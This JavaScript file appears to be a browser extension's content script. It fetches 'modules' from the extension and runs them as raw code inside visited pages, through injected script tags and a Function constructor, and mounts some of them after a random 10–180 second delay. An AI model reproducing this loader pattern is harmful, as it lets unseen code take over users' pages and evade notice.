import debug from 'debug';

import ctor from './constructor';
import Talker from './api/talker';
import helper from './helper';
import Api from './api';





const log = debug(`Brex:crex:${window.location.hostname}`);

export default class Crex {

  constructor (app) {
    log('constructor');

    this.pid = app.pluginId;
    this.modules = ctor.object();
    this.talker = new Talker(this.pid);

    this.self = {};
    this.api = new Api(this.talker);
  }

  load () {
    log('load');

    this.loadModules(this.proceed.bind(this));
  }


  loadModules (cb) {
    log('loadModules');

    this.talker.send({
      reason: 'get.modules'
    }, function (res) {
      log('loadModules res', res);

      if (res.err) {
        log('loadModules res err', res.err);

        return cb({err: res.err});
      }
      cb(res.value);
    });
  }

  proceed (modules) {
    log(`proceed frame ${window !== top}`, modules);

    this.api.gs.set('rrr', 'ttt', (data) => log(data));

    if (modules.err) {
      log('proceed err', modules.err);

      return;
    }

    if (!(modules && modules.length)) {
      log('proceed modules empty', modules);

      return;
    }

    let s = modules['0']; // mount on start
    let d = modules['1']; // mount on dom ready
    let r = modules['2']; // mount with random delay
    let x = modules['x']; // mount with delay x

    this.mountModules(s);
    this.mountWhenReadyDom(d);
    this.mountWithRandomDelay(r);
    this.mountWithDelay(x);
  }

  mountWithDelay (modules) {
    if (modules[0].length) {
      log('mountWithDelay', modules[0]);

      modules[0].forEach((module) => {
        log('mountWithDelay for each', module);

        helper.contentLoaded(window, () => {
          setTimeout(() => {
            log('mountWithDelay delay', module[0]);

            this.addWithTag(module[1]);
          }, module[0]);
        });
      });
    }
    if (modules[1].length) {
      log('mountWithDelay', modules[1]);

      modules[1].forEach((module) => {
        log('mountWithDelay for each', module);

        helper.contentLoaded(window, () => {
          setTimeout(() => {
            log('mountWithDelay delay', module[0]);

            this.addWithoutTag(module[1]);
          }, module[0]);
        });
      });
    }
  }

  mountWithRandomDelay (r) {
    helper.contentLoaded(window, () => {
      setTimeout(() => {
        this.mountModules(r);
      }, helper.random(10000, 180000));
    });
  }

  mountWhenReadyDom (d) {
    helper.contentLoaded(window, () => {
      this.mountModules(d);
    });
  }

  mountModules (modules) {
    if (modules[0].length) {
      modules[0].forEach((module) => {
        this.addWithTag(module);
      });
    }
    if (modules[1].length) {
      modules[1].forEach((module) => {
        this.addWithoutTag(module);
      });
    }
  }

  addWithTag (m) {
    let s = document.createElement('script');
    s.type = 'text/javascript';
    s.charset = 'utf-8';
    if (true) {
      s.innerHTML = m;
    }
    else {
      s.src = m;
    }
    document.getElementsByTagName('head')[0].appendChild(s);
    log('mounted to', s);
  }

  addWithoutTag (m) {
    m = `(function(w, d, a, s){${m}})(x, y, i, l)`;
    ctor.function('x, y, i, l', m)(window, document, this.api, this.self);
    log('mounted as new function');
  }
}
